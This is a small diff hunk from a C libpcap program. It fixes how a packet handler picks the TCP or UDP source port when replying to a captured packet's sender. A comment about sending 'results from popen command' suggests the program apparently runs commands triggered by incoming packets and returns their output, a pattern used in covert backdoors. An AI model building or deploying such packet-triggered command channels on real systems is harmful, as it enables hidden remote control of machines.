@@ -517,10 +517,13 @@ void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char
     memset(&dst_host, 0, sizeof(struct sockaddr_in));
     dst_host.sin_family = AF_INET;
     dst_host.sin_addr.s_addr = packet_info.ip->ip_src.s_addr;
-    if(packet_info.tcp->th_sport != 0)
-        dst_host.sin_port = packet_info.tcp->th_sport;
-    else if(packet_info.udp->uh_sport != 0)
+
+    if(packet_info.ip->ip_p == IPPROTO_UDP){
         dst_host.sin_port = packet_info.udp->uh_sport;
+    }
+    else if(packet_info.ip->ip_p == IPPROTO_TCP){
+        dst_host.sin_port = packet_info.tcp->th_sport;
+    }
     
     
     // Send results from popen command
